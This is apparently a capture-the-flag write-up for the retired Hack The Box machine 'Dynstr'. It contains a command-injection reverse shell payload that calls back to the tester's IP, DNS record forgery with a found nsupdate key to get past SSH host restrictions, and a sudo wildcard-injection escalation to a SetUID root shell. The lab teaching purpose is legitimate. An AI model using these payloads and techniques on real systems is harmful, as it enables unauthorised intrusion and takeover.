# Dynstr

This is the write-up for the box Dynstr that got retired at the 16th October 2021.
My IP address was 10.10.14.2 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.244    dynstr.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/dynstr.nmap 10.10.10.244
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA)
|   256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA)
|_  256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Dyna DNS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 80)

The website advertises **Dynamic DNS** services and there is some valuable information on it:

![Dyna DNS homepage](dynstr_web-1.png)

The hostnames have to be added to our _/etc/hosts_ file to enumerate the domains further:
- dnsalias.htb
- dynamicdns.htb
- no-ip.htb

## Checking DNS (Port 53)

As the [API of no-ip.com](https://www.noip.com/integrate/request) is used, we can try to login with the provided credentials as described in the documentation:
```
curl 'http://dynadns:sndanyd@10.10.10.244/nic/update?hostname=test.dynamicdns.htb&myip=10.10.14.2'

good 10.10.14.2
```

It works and the domain _test.dynamicdns.htb_ gets now resolved to my IP address:
```
nslookup

> server 10.10.10.244

> test.dynamicdns.htb
Server:         10.10.10.244
Address:        10.10.10.244#53

Name:   test.dynamicdns.htb
Address: 10.10.14.2
```

When trying to register an invalid hostname with special characters, it shows an error message:
```
curl 'http://dynadns:sndanyd@10.10.10.244/nic/update?hostname=test!.dynamicdns.htb&myip=10.10.14.2'

911 [nsupdate failed]
```

It uses the Dynamic DNS update utility [nsupdate](https://linux.die.net/man/8/nsupdate) and there could be a command injection vulnerability in
this request:
```
time curl 'http://dynadns:sndanyd@10.10.10.244/nic/update?hostname=test`sleep+3`.dynamicdns.htb&myip=10.10.14.2'

good 10.10.14.2

real    0m6.192s
```

By using the `time` command, it can be observed how long the request takes and because of the `sleep` command injection, it takes longer than usual and proofs command execution.

Forwarding `curl` command to **Burpsuite**:
```
curl --proxy http://localhost:8080 'http://dynadns:sndanyd@10.10.10.244/nic/update?hostname=test`sleep+3`.dynamicdns.htb&myip=10.10.14.2'
```

Sending a reverse shell command:
```
GET /nic/update?hostname=test`bash -c 'bash -i >& /dev/tcp/0x0a0a0e02/9001 0>&1'`.dynamicdns.htb&myip=10.10.14.2 HTTP/1.1
```

The IP was changed to a hex format because further dot symbols will make the command injection fail.
After URL-encoding and sending the request, the listener on my IP and port 9001 starts a reverse shell as _www-data_.

## Privilege Escalation

In the home folder _/home/bindmgr_ the _.ssh/authorized_keys_ file reveals a hostname, that allows to SSH from there:
```
from="*.infra.dyna.htb" (...)
```

There is another directory _support-case-C62796521_ with four files:
- C62796521-debugging.script
- C62796521-debugging.timing
- command-output-C62796521.txt
- strace-C62796521.txt

The _strace_ file leaks the private SSH key of the user, but login is not possible because it is only allowed from the domain _*.infra.dyna.htb_.

The file _/var/www/html/nic/update_ shows how the DNS entries are generated and can be used to imitate the domain:
```
nsupdate -t 1 -k /etc/bind/ddns.key
> update add test.infra.dyna.htb 30 IN A 10.10.14.2
> send

update failed: REFUSED
```

Unfortunately creating a hostname with the key _ddns.key_ is not allowed.
There is another file _/etc/bind/infra.key_ which could be the correct key for the domain _dyna.htb_:
```
nsupdate -t 1 -k /etc/bind/infra.key
> update add test.infra.dyna.htb 30 IN A 10.10.14.2
> send
```

Creating a **reverse DNS lookup** to my IP:
```
> add 2.14.10.10.in-addr.arpa 30 IN PTR test.infra.dyna.htb
> send
```

Now the domain _test.infra.dyna.htb_ resolves to my IP address and also resolves to the domain for the box:
```
nslookup

> server 10.10.10.244

> test.infra.dyna.htb
Server:         10.10.10.244
Address:        10.10.10.244#53

Name:   test.infra.dyna.htb
Address: 10.10.14.2

> 10.10.14.2
2.14.10.10.in-addr.arpa name = test.infra.dyna.htb.
```

The SSH key for _bindmgr_ now works to login:
```
ssh -i bindmgr.key bindmgr@10.10.10.244
```

### Privilege Escalation to root

The user _bindmgr_ is able to execute a bash script with root privileges:
```
User bindmgr may run the following commands on dynstr:
    (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh
```

This script has a flaw and uses a wildcard character in a `cp` command:
```
(...)
cp .version * /etc/bind/named.bindmgr/
(...)
```

A wildcard character can be abused to send parameters to commands.
With the parameter _"--preserve=mode"_ it is possible to keep the permissions of a file, so it has to be created as a file:
```
cd /dev/shm

echo 1 > .version

touch -- '--preserve=mode'
```

Copying `bash` to the current directory and setting the **SetUID bit**:
```
cp /bin/bash /dev/shm

chmod 4755 bash
```

Executing the script with `sudo` privileges:
```
sudo /usr/local/bin/bindmgr.sh
```

It copies the `bash` binary into _/etc/bind/named.bindmgr/_ and can be executed with elevated privileges:
```
/etc/bind/named.bindmgr/bash -p

bash-5.0# id
uid=1001(bindmgr) gid=1001(bindmgr) euid=0(root) groups=1001(bindmgr)
```

It starts a shell as root!
